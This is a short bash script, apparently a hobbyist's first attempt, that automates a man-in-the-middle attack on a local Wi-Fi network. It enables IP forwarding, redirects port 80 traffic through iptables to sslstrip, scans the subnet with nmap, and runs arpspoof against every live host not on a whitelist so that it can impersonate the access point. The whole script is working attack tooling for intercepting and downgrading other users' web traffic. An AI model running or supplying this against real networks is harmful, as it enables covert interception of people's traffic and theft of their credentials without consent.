#!/bin/bash
#My first script
echo "Started"
echo ""

#Input variables
network=192.168.2.0
netmask=24
accesspointIP=192.168.2.1
whitelist=(192.168.2.1 192.168.2.101 192.168.2.108)

echo "whitelist:"
for i in "${whitelist[@]}"
do
  echo $i
done

echo ""

echo 1 > /proc/sys/net/ipv4/ip_forward 
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8844
nohup sslstrip -p -l 8844 >/dev/null 2>&1 &
sslstripPID=$!
echo "sslstrip by Moxie Marlinspike running..."
#kill -SIGINT $sslstripPID
echo -e "\tsslstripPID="$sslstripPID

echo ""

upIPArray=($(nmap -sP $network/$netmask -oG - | awk '$4=="Status:" && $5=="Up" {print $2}'))
echo "Up IPs"
for i in "${upIPArray[@]}"
do
  echo -e "\t"$i
done

echo ""

unknownIPArray=()
for i in "${upIPArray[@]}"; 
do
  skip=
  for j in "${whitelist[@]}"; 
  do
    [[ $i == $j ]] && { skip=1; break; }
  done
  [[ -n $skip ]] || unknownIPArray+=("$i")
done
echo "Unknown Up IPs"
declare -A arpspoofPIDs=()
for i in "${unknownIPArray[@]}"
do
  nohup arpspoof -i wlan0 -t $i $accesspointIP >/dev/null 2>&1 &  # doesn't create nohup.out
  arpspoofPIDs+=([$i]=$!)
done
for ip in "${!arpspoofPIDs[@]}"
do 
  echo -e "\t$ip - arpspoofPID: ${arpspoofPIDs["$ip"]}"
done

echo ""

echo "Stoping arpspoof.." 
for ip in "${!arpspoofPIDs[@]}"
do
  kill -SIGINT ${arpspoofPIDs["$ip"]}
done
echo "Stoping sslstrip.." 
kill -SIGINT $sslstripPID
kill $sslstripPID

echo -e "\nAll finished.\n" 
echo -e "
      _       _               _____                           
     | |     | |             / ____|                          
     | |_   _| | ___ _ __   | |     _ __ ___  ___ _ __   ___  
 _   | | | | | |/ _ \ '_ \  | |    | '__/ _ \/ __| '_ \ / _ \ 
| |__| | |_| | |  __/ | | | | |____| | |  __/\__ \ |_) | (_) |
 \____/ \__,_|_|\___|_| |_|  \_____|_|  \___||___/ .__/ \___/ 
                                                 | |          
                                                 |_|          
"
exit 0
